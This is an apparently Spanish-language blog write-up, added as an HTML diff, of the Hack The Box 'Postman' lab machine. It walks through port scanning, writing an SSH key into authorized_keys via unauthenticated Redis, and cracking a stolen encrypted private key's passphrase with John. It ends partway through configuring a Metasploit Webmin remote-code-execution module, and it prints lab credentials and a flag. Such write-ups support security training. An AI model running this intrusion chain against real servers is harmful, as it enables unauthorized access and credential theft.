@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xxmeshxx">
+
+
+
+
+
+<title>HTB-Postman | xxmeshxx</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">xxmeshxx</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/category">Categorias</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">xxmeshxx</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/category">Categorias</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+    <meta http-equiv=”Content-Type” content=”text/html; charset=UTF-8″ />
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">HTB-Postman</h1>
+            
+                <div class="post-meta">
+                    <!--
+                        Author: <a itemprop="author" rel="author" href="/">xxmeshxx</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">marzo 14, 2020&nbsp;&nbsp;10:41:50</a>
+                        </span>
+                    -->
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/HTB/">HTB</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h1><p>Postman es una maquina con un servicio en particular llamado Redis, es un rápido almacén de datos clave-valor en memoria de código abierto que se puede utilizar como base de datos, caché, agente de mensajes y cola.</p>
+<p><img src="../postman/card.png" alt=""></p>
+<h2 id="Masscan-amp-Nmap"><a href="#Masscan-amp-Nmap" class="headerlink" title="Masscan &amp; Nmap"></a>Masscan &amp; Nmap</h2><p><strong>Masscan</strong> nos arroja rapidamente que el existen 5 puertos abiertos. </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@xxmeshxx:~# masscan -p1-65535,U:1-65535 10.10.10.160 --rate=1000 -e tun0</span><br><span class="line">Starting masscan <span class="number">1.0</span><span class="number">.4</span></span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning <span class="number">1</span> hosts [<span class="number">131070</span> ports/host]</span><br><span class="line">Discovered open port <span class="number">10000</span>/tcp on <span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span>                                 </span><br><span class="line">Discovered open port <span class="number">6379</span>/tcp on <span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span>                                  </span><br><span class="line">Discovered open port <span class="number">80</span>/tcp on <span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span>                                    </span><br><span class="line">Discovered open port <span class="number">10000</span>/udp on <span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span>                                 </span><br><span class="line">Discovered open port <span class="number">22</span>/tcp on <span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span></span><br></pre></td></tr></table></figure>
+<p>Los puertos 10000 80 y 6379 se ven intersantes, procedemos a hacer un <strong><em>Nmap</em></strong>.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@xxmeshxx:~# nmap -sC -sV -p80,10000,6379 10.10.10.160</span><br><span class="line">Starting Nmap <span class="number">7.70</span> ( https:<span class="comment">//nmap.org ) at 2020-03-14 12:19 CDT</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span></span><br><span class="line"><span class="function">Host is <span class="title">up</span> <span class="params">(<span class="number">0.073</span>s latency)</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">PORT      STATE SERVICE VERSION</span></span><br><span class="line"><span class="function">80/tcp    open  http    Apache httpd 2.4.29 <span class="params">((Ubuntu)</span>)</span></span><br><span class="line"><span class="function">|_http-server-header: Apache/2.4.29 <span class="params">(Ubuntu)</span></span></span><br><span class="line"><span class="function">|_http-title: The Cyber Geek's Personal Website</span></span><br><span class="line"><span class="function">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="function">10000/tcp open  http    MiniServ 1.910 <span class="params">(Webmin httpd)</span></span></span><br><span class="line"><span class="function">|_http-title: Site doesn't have a <span class="title">title</span> <span class="params">(text/html; Charset=iso<span class="number">-8859</span><span class="number">-1</span>)</span>.</span></span><br></pre></td></tr></table></figure>
+<p>Revisamos en el navegador el puerto 80:<br><img src="../postman/website.png" alt=""><br>La pagina menciona que esta bajo construcción</p>
+<p><strong><em>Webmin</em></strong>  &gt; <a href="https://10.10.10.160:10000" target="_blank" rel="noopener">https://10.10.10.160:10000</a> Encontramos un login al Webmin sin embargo no contamos con credenciales para acceder, buscando un poco en <strong><em>Google</em></strong> vemos que existe un <a href="https://www.exploit-db.com/exploits/46984" target="_blank" rel="noopener">exploit</a> para <strong><em>Metasploit</em></strong> que requiere de igual manera credenciales para poder ejecutarlo.</p>
+<p><img src="../postman/webmin.png" alt=""></p>
+<p>Buscando <strong><em>Redis</em></strong> en <strong><em>Google</em></strong> menciona que cuenta con una vulnerabilidad <strong><em>Unauthorized Access Vulnerability</em></strong> que permite sobreescribir credenciales <strong><em>ssh</em></strong> al servidor tal y como lo menciona @Victor Zhu en su <a href="https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419" target="_blank" rel="noopener">post</a>  </p>
+<h2 id="Shell-inicial"><a href="#Shell-inicial" class="headerlink" title="Shell inicial"></a>Shell inicial</h2><p>Generar contraseñas y cargando la <strong><em>key</em></strong> al servidor redis: </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@xxmeshxx:~# ssh-keygen -t rsa</span><br><span class="line">Generating <span class="keyword">public</span>/<span class="keyword">private</span> rsa key pair.</span><br><span class="line"><span class="function">Enter file in which to save the <span class="title">key</span> <span class="params">(/root/.ssh/id_rsa)</span>: id_rsa</span></span><br><span class="line"><span class="function">Enter <span class="title">passphrase</span> <span class="params">(empty <span class="keyword">for</span> no passphrase)</span>: </span></span><br><span class="line"><span class="function">Enter same passphrase again: </span></span><br><span class="line"><span class="function">Your identification has been saved in id_rsa.</span></span><br><span class="line"><span class="function">Your <span class="keyword">public</span> key has been saved in id_rsa.pub.</span></span><br><span class="line"><span class="function">The key fingerprint is:</span></span><br><span class="line"><span class="function">SHA256:splewqI9+zjUrKn8s+KSO9LLGpPkp1sASZFZK4gIUj8 root@xxmeshxx</span></span><br><span class="line"><span class="function">The key's randomart image is:</span></span><br><span class="line"><span class="function">+---[RSA 2048]----+</span></span><br><span class="line"><span class="function">|o+*.             |</span></span><br><span class="line"><span class="function">|B+ ..            |</span></span><br><span class="line"><span class="function">|*. .E            |</span></span><br><span class="line"><span class="function">|. .  .           |</span></span><br><span class="line"><span class="function">| o   o. S        |</span></span><br><span class="line"><span class="function">|o.. ..o</span>=         |</span><br><span class="line">|++ +.o* .        |</span><br><span class="line">|==*o*+ o         |</span><br><span class="line">|+OO=*Bo          |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">root@xxmeshxx:~# (echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; key.txt</span><br><span class="line">root@xxmeshxx:~# cat key.txt | redis-cli -h 10.10.10.160 -x set crackit</span><br></pre></td></tr></table></figure>
+
+<p>Configurando <strong><em>Redis</em></strong>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@xxmeshxx:~# redis-cli -h 10.10.10.160</span><br><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span>:<span class="number">6379</span>&gt; config get dir</span><br><span class="line"><span class="number">1</span>) <span class="string">"dir"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"/var/lib/redis/.ssh"</span></span><br><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span>:<span class="number">6379</span>&gt; config set dir /<span class="keyword">var</span>/lib/redis/.ssh</span><br><span class="line">OK</span><br><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span>:<span class="number">6379</span>&gt; config set dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span>:<span class="number">6379</span>&gt; save</span><br></pre></td></tr></table></figure>
+
+<p>Ingresando al servidor:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@xxmeshxx:~# chmod 600 id_rsa</span><br><span class="line">root@xxmeshxx:~# ssh -i id_rsa redis@10.10.10.160</span><br></pre></td></tr></table></figure>
+<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis<span class="meta">@Postman</span>:~$ cd /opt</span><br><span class="line">redis<span class="meta">@Postman</span>:/opt$ ls</span><br><span class="line">id_rsa.bak</span><br><span class="line">redis<span class="meta">@Postman</span>:/opt$ ls -la /home</span><br><span class="line">total <span class="number">12</span></span><br><span class="line">drwxr-xr-x  <span class="number">3</span> root root <span class="number">4096</span> Sep <span class="number">11</span>  <span class="number">2019</span> .</span><br><span class="line">drwxr-xr-x <span class="number">22</span> root root <span class="number">4096</span> Aug <span class="number">25</span>  <span class="number">2019</span> ..</span><br><span class="line">drwxr-xr-x  <span class="number">6</span> Matt Matt <span class="number">4096</span> Sep <span class="number">11</span>  <span class="number">2019</span> Matt</span><br></pre></td></tr></table></figure>
+<p>Para transferirlo el id_rsa.bak a mi computadora sacamos el <strong>base64</strong> del archivo.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">redis<span class="meta">@Postman</span>:/opt$ base64 id_rsa.bak </span><br><span class="line">LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF</span><br><span class="line">Sy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlX</span><br><span class="line">eCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtL</span><br><span class="line">Sm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdH</span><br><span class="line">c1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNq</span><br><span class="line">cDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGly</span><br><span class="line">cVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlN</span><br><span class="line">R1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZ</span><br><span class="line">dXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgz</span><br><span class="line">d2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpC</span><br><span class="line">VUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3Qw</span><br><span class="line">Vko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1p</span><br><span class="line">OEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVds</span><br><span class="line">cGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5Kcjcv</span><br><span class="line">TWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0</span><br><span class="line">S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpL</span><br><span class="line">ZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdw</span><br><span class="line">M0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4</span><br><span class="line">VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZm</span><br><span class="line">M21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6</span><br><span class="line">VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRK</span><br><span class="line">M3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dW</span><br><span class="line">cExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0Jj</span><br><span class="line">eU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3</span><br><span class="line">TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRS</span><br><span class="line">VDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJK</span><br><span class="line">MThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1</span><br><span class="line">a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnla</span><br><span class="line">SDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZp</span><br><span class="line">NVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3</span><br><span class="line">PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K</span><br></pre></td></tr></table></figure>
+
+<p>En nuestro equipo:</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@xxmeshxx:~# echo -n <span class="string">"LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K"</span> | base64 -d &gt; Matt</span><br></pre></td></tr></table></figure>
+
+<p>Teniendo el hash del <strong><em>Matt</em></strong> lo pasaremos a otro formato con <strong><em>ssh2john</em></strong> para poder crackearlo:<br>Descarga de <a href="https://github.com/koboi137/john/blob/bionic/ssh2john.py" target="_blank" rel="noopener">ssh2john.py</a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@xxmeshxx:~#python ssh2john.py Matt &gt; key</span><br></pre></td></tr></table></figure>
+<p>El resultado se lo pasamos a <strong><em>John</em></strong> especificandole que el formato es <strong><em>SSH</em></strong>.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@xxmeshxx:~#john --wordlist=/root/rockyou.txt --format=SSH key</span><br><span class="line">Using <span class="keyword">default</span> input encoding: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) <span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line">Cost <span class="number">1</span> (KDF/cipher [<span class="number">0</span>=MD5/AES <span class="number">1</span>=MD5/<span class="number">3</span>DES <span class="number">2</span>=Bcrypt/AES]) is <span class="number">1</span> <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost <span class="number">2</span> (iteration count) is <span class="number">2</span> <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run <span class="number">2</span> OpenMP threads</span><br><span class="line">Note: This format may emit <span class="literal">false</span> positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">computer2008     (id_rsa)</span><br><span class="line">Warning: Only <span class="number">1</span> candidates left, minimum <span class="number">2</span> needed <span class="keyword">for</span> performance.</span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">13</span> DONE (<span class="number">2019</span><span class="number">-12</span><span class="number">-14</span> <span class="number">23</span>:<span class="number">23</span>) <span class="number">0.07369</span>g/s <span class="number">1056</span>Kp/s <span class="number">1056</span>Kc/s <span class="number">1056</span>KC/s *<span class="number">7</span>¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+<p>Vemos que nos arroja la contraseña <strong><em>computer2008</em></strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis<span class="meta">@Postman</span>:/opt$ su Matt</span><br><span class="line">Password:            </span><br><span class="line">Matt<span class="meta">@Postman</span>:/opt$ cat /home/Matt/user.txt</span><br><span class="line"><span class="number">517</span>ad0ec2458ca97af8d93aac08a2f3c</span><br></pre></td></tr></table></figure>
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Entramos al servidor <strong><em>Webmin</em></strong> &gt; <a href="https://10.10.10.160:10000" target="_blank" rel="noopener">https://10.10.10.160:10000</a> con las credenciales y vemos un dashboard. Lo que nos indica que tenemos permisos y podemos utilizar el <a href="https://www.exploit-db.com/exploits/46984" target="_blank" rel="noopener">exploit</a> que previamente encontramos.<br><img src="../postman/webmin_dash.png" alt=""></p>
+<p>Descargamos y configuramos el exploit dentro <strong><em>Metasploit</em></strong></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/rce_webmin) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/rce_webmin):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD   computer2008     yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="keyword">type</span>:host:port[,<span class="keyword">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target address <span class="keyword">range</span> or CIDR 